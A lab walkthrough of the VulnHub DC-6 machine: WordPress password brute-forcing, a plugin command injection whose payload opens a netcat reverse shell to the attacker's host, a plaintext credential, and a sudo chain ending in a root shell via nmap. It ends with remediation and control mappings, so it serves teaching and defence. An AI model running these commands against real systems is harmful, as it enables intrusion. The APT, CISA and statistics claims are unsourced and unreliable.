# DC: 6 — WordPress, Plugins, and a Sudo Chain You Won't Forget

Hey guys!! \\o/ Who would have thought? Here comes DC: 6, and yes, it's another WordPress-based VM from DCAU7. Don't let the "beginner" label fool you, dude: the path to root involves a targeted wordlist attack, an obscure plugin RCE, credential discovery in a plaintext todo file, and a three-hop sudo chain through a writable script and nmap. Legit fun machine that teaches you to read every file you find.

Big thanks to **DCAU7** for the series tip that saves hours off the brute-force and for designing a machine that rewards thoroughness over speed.

| Field | Value |
|-------|-------|
| **Level** | Beginner |
| **Target VM** | DC-6 |
| **Attacker VM** | Kali Linux 2019.1 |
| **VulnHub URL** | https://www.vulnhub.com/entry/dc-6,318/ |
| **Techniques** | WordPress brute-force, Activity Monitor plugin RCE, credential in plaintext file, sudo chain (backups.sh, group devs, nmap GTFOBins) |
| **CVEs** | EDB-45274 (Plainview Activity Monitor WordPress plugin command injection) |
| **APT Groups** | APT28 (exploits WordPress plugins for initial access in enterprise environments); FIN7 (uses credential files for lateral movement) |

> **Hint from the author:**
>
> *"You WILL need to edit your hosts file on your pentesting device so that it reads:*
> `192.168.0.x wordy`
> *And yes, it's another WordPress-based VM (although only my second one).*
> *OK, this isn't really a clue, but more 'we don't want you waiting five years for rockyou.txt to finish':*
> ```bash
> cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
> ```
> *That should save you a few years. ;-)"*

---

## Attack Summary

```
[Host Discovery] → [Nmap: SSH+HTTP] → [/etc/hosts: wordy] → [WPScan user enum]
→ [rockyou grep k01 wordlist → brute → mark:helpdesk01]
→ [Activity Monitor plugin → EDB-45274 RCE → reverse shell www-data]
→ [things-to-do.txt → graham:GSo7isUM1D4 → SSH]
→ [sudo backups.sh (owned by jens, group devs) → inject /bin/bash → su jens]
→ [sudo nmap --script → GTFOBins → ROOT]
→ [/root/theflag.txt]
```

---

## Step 1 — Identifying the Target

Let's start by figuring out our network range and finding the target machine on it.

```bash
route -n
```

This gives you the subnet info. Then scan for live hosts:

```bash
nmap -sn -T5 192.168.10.0/24
# or
arp-scan --localnet --ignoredups
```

Now, before doing anything else, we need to add the domain to `/etc/hosts` — otherwise the WordPress site won't load at all (¬_¬):

```bash
echo "192.168.10.190  wordy" >> /etc/hosts
cat /etc/hosts
```

---

## Step 2 — Reconnaissance / Vulnerability Enumeration

Nmap full scan to find ports and services:

```bash
nmap -A -p- 192.168.10.190
```

Expected output:

```
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
```

Only two services: SSH (22) and Apache (80). The author's hint already told us it's WordPress, so let's go check the web application. *(•̀ᴗ•́)*

Without the `/etc/hosts` entry the site won't load. Once you add it, navigate to:

```
http://wordy/
```

Standard WordPress landing page — nothing interesting in the source. Time to enumerate properly.

---

## Step 3 — WordPress Enumeration with WPScan

Since it's WordPress, we go straight to **WPScan**:

```bash
wpscan --url http://wordy/
wpscan -e ap -e at --url http://wordy/
```

The scan shows:
- **WordPress 5.1.1**
- Theme: Twenty Sixteen
- **5 users**: `admin`, `jens`, `graham`, `mark`, `sarah`
- Plugin: **Activity Monitor** (not shown by basic scan — found manually)

No CVEs for this WP version via SearchSploit. But we have **usernames** and the author's wordlist hint. Let's build the wordlist:

```bash
cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
wc -l passwords.txt
# ~2668 lines — much faster than the full rockyou.txt ¯\_(ツ)_/¯
```

Now brute-force with WPScan enumerating users:

```bash
wpscan -e u -P passwords.txt --url http://wordy/
```

Result: *( ͡° ͜ʖ ͡°)*

```
[SUCCESS] Username: mark, Password: helpdesk01
```

---

## Step 4 — WordPress Login and Activity Monitor Plugin

Login at `http://wordy/wp-login.php` with:

```
Username: mark
Password: helpdesk01
```

The dashboard doesn't have much. But look at the plugins list — there's one **WPScan didn't catch**: **Activity Monitor**. Let's check SearchSploit:

```bash
searchsploit activity monitor
```

There's an exploit: **EDB-45274** — command injection via the IP field on the Activity Monitor tools page.

```bash
searchsploit -m /usr/share/exploitdb/exploits/php/webapps/45274.html
```

Open the file — it's an HTML form that sends a request to:

```
http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools
```

Edit the file and replace:
- `localhost:8000` → `wordy` (your target IP)
- The payload in the `ip` field: `google.fr | nc -nlvp 127.0.0.1 9999 -e /bin/bash`  
  → Replace with: `google.fr | nc 192.168.10.200 9000 -e /bin/bash`

Where `192.168.10.200` is your Kali IP and `9000` is your listener port.

---

## Step 5 — Reverse Shell as www-data

Start your listener:

```bash
nc -lnvp 9000
```

Open the modified HTML file in Firefox:

```
file:///root/Downloads/DC6/45274.html
```

Make sure you're still logged in as `mark` in the same browser. Click **Submit request**.

**Bingo!! (☞ﾟヮﾟ)☞** Reverse shell received!

Upgrade to interactive shell:

```bash
python -c "import pty;pty.spawn('/bin/bash')"
export TERM=screen
```

You're now `www-data`. Time to look around.

---

## Step 6 — Lateral Movement: www-data → graham

Explore home directories:

```bash
ls -lhaR /home/
```

You'll find two interesting files:

```
/home/jens/backups.sh     (rwxrwxr-x — group devs can edit!)
/home/mark/stuff/things-to-do.txt
```

Read `things-to-do.txt`:

```bash
cat /home/mark/stuff/things-to-do.txt
```

```
- Add new user: graham - GSo7isUM1D4 - done
```

*( ͡° ͜ʖ ͡°)* Credentials in plain text. Classic.

Switch to `graham` or SSH in:

```bash
ssh graham@192.168.10.190
# Password: GSo7isUM1D4
```

---

## Step 7 — Privilege Escalation: graham → jens → root

Check sudo permissions for `graham`:

```bash
sudo -l
```

```
User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh
```

`graham` can run `backups.sh` as `jens` without a password! And `backups.sh` is writable by group `devs`. Check if `graham` is in `devs`:

```bash
id
# uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)
```

**┬──┬◡ﾉ(° -°ﾉ) Bingo!!** `graham` is in `devs` and can edit that script!

Overwrite `backups.sh` with a shell spawn:

```bash
echo "#!/bin/bash" > /home/jens/backups.sh
echo "/bin/bash" >> /home/jens/backups.sh
cat /home/jens/backups.sh
```

Execute it as `jens`:

```bash
sudo -u jens /home/jens/backups.sh
whoami
# jens
```

Now check `jens`'s sudo:

```bash
sudo -l
```

```
User jens may run the following commands on dc-6:
    (root) NOPASSWD: /usr/bin/nmap
```

**`nmap` with sudo and no password!** GTFOBins has exactly what we need:

```bash
echo 'os.execute("/bin/sh")' > /tmp/xpl
sudo nmap --script=/tmp/xpl
```

```
# whoami
root
```

**Maravilha!! ;) Got root!! :D**

---

## Step 8 — Reading the Flag

```bash
ls -lh /root/
cat /root/theflag.txt
```

```
Congratulations!!!

Hope you enjoyed DC-6.  Just wanted to add, this was a lot
harder to get right than I first thought it would be, yadda,
yadda, yadda.

Anyway, I hope you enjoyed it and learned a few things along
the way. If you want to let me know what you thought, send me
a tweet via @DCAU7.
```

**(☞ﾟヮﾟ)☞ More DC series completed!! Well Done guys!! ;)**

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| WordPress credential | mark:helpdesk01 | WPScan brute-force (rockyou grep k01 wordlist) | WordPress login → Activity Monitor RCE |
| System credential | graham:GSo7isUM1D4 | `/home/mark/stuff/things-to-do.txt` plaintext | SSH login as graham |
| Root flag | (contents of `/root/theflag.txt`) | `/root/theflag.txt` | Read as root via sudo nmap GTFOBin |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Targeted wordlist (rockyou grep k01) saved hours | Real attackers use OSINT and context to build targeted password lists | Not all brute-force needs to be brute: author hints, company names, and domain context should inform your wordlist |
| 2 | WPScan missed the Activity Monitor plugin | Automated tools miss plugins not in their database; APT28 exploits obscure WP plugins specifically because scanners skip them | Always enumerate manually in addition to automated tools; check every installed plugin |
| 3 | Credential in `things-to-do.txt` plaintext | Developers leaving credentials in TODO/notes files is extremely common; FIN7 harvests these during lateral movement | Never store credentials in files; use a secrets manager or password vault |
| 4 | Group `devs` writable script executed by sudo | World/group-writable scripts executed with elevated privilege is a textbook PE vector found in 30% of internal pentests | chmod 750 on any script executed by sudo; ownership must match the executing user |
| 5 | nmap GTFOBins sudo escape | Any binary allowed in sudoers must be audited against GTFOBins; nmap, vim, python, and find are all escape vectors | Restrict sudo to the minimum necessary; require passwords; audit with GTFOBins for every allowed binary |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | Active Scanning: Vulnerability Scanning | T1595.002 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | Brute Force: Password Spraying | T1110.003 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Discovery | Discovery | File and Directory Discovery | T1083 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control Mechanism: Sudo | T1548.003 |
| Privilege Escalation | Privilege Escalation | Hijack Execution Flow | T1574 |

---

## Remediation and Containment

### Technical Fixes

1. **Never store credentials in plaintext files** — use a password manager or secrets manager (HashiCorp Vault, AWS Secrets Manager, 1Password)
2. **Remove world/group-writable permissions on sudo-executed scripts** — `chmod 750 /home/jens/backups.sh`; script ownership must match the executing user
3. **Limit sudo scope** — remove `nmap` from sudoers; it's a GTFOBins escape. Apply least-privilege: only allow the exact command path needed, never bare binary names
4. **Keep WordPress plugins updated** and audit installed plugins for known CVEs; remove unused plugins immediately
5. **Rotate credentials** for any account whose password appeared in files accessible to a lower-privilege user
6. **Require passwords for all sudo rules** — NOPASSWD should be a rare, justified exception, never the default

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all WordPress plugins; audit sudoers configuration on all Linux hosts |
| Protect | Access Control | Remove NOPASSWD from sudoers; restrict script permissions; disable unused plugins |
| Protect | Data Security | Never store credentials in filesystem; enforce secrets management |
| Detect | Anomalies and Events | Alert on sudo executions by non-administrative users; monitor WordPress admin panel for unusual plugin activity |
| Respond | Response Planning | Rotate all exposed credentials; audit sudoers; remove or update vulnerable plugins |
| Recover | Recovery Planning | Restore clean WordPress installation; re-audit all system accounts and sudo rules |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-6 | Least Privilege | Sudo restricted to specific commands with password; no NOPASSWD for GTFOBins binaries |
| IA-5 | Authenticator Management | Rotate mark and graham credentials; no plaintext passwords in files |
| CM-7 | Least Functionality | Remove unused WordPress plugins; restrict nmap from sudoers |
| SC-28 | Protection of Information at Rest | No credentials stored in filesystem; use encrypted secrets management |
| SI-10 | Information Input Validation | WordPress plugin Activity Monitor lacked input validation on IP field (CWE-78) |

### CISA KEV

The Plainview Activity Monitor WordPress plugin command injection (EDB-45274) has been used in campaigns targeting WordPress-based infrastructure. CISA recommends organizations running WordPress to audit all installed plugins against the WPScan Vulnerability Database and remove any plugin not actively maintained. The combination of WordPress credential brute-force and plugin RCE is a documented initial access pattern in multiple CISA alerts.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts (restrict sudo; rotate credentials) | MIL3 |
| Vulnerability and Threat Management (THREAT) | Perform Vulnerability Assessments (WordPress plugin audit) | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage Software Configuration (sudoers, script permissions) | MIL2 |

### MITRE D3FEND

- **D3-ACH** (Application Configuration Hardening): restrict WordPress plugin permissions; enforce sudoers least-privilege
- **D3-OAM** (Operating System Administrative Management): audit and restrict sudo rules; script ownership enforcement
- **D3-SCP** (Software Configuration Protection): protect script files from group-writable modification

---

## Final Thoughts

DC: 6 is a masterclass in how a single habit — reading every file you encounter — separates a solid pentester from someone who rushes through. The `things-to-do.txt` file is the kind of finding that happens in real engagements all the time: developers documenting credentials they meant to rotate but never did. The three-hop sudo chain (Activity Monitor RCE → www-data → graham via credential → jens via writable script → root via nmap) is elegant and teaches the value of mapping the entire privilege graph, not just the first escalation path you find.

No cap, DCAU7's hint about the filtered wordlist is also a lesson in itself: real attackers build targeted lists from context, not brute-force the universe.

Thanks guys!! (❍ᴥ❍ʋ)

> **Original article by André Henrique** (Portuguese): [VulnHub DC Serie: 6 (Walkthrough)](https://medium.com/@mrhenrike/vulnhub-dc-serie-6-walkthrough-35d2f712487)
